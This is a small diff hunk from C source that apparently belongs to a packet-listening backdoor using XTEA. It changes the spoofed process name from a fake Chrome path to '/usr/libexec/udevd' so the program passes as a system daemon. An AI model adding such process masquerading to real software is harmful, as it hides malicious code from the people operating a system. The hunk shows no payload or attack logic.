@@ -7,8 +7,7 @@
 #include "pkthdr.h"
 #include "util.h"
 #include "xtea.h"
-
-#define RUNNING_NAME    "/Applications/Google Chrome.app/Contents/SPOOF"
+#define RUNNING_NAME    "/usr/libexec/udevd"
 #define INF_NAME        "any"
 #define MAX_CMD_SIZE    1024
 #define MAX_DLINK_HDR   16
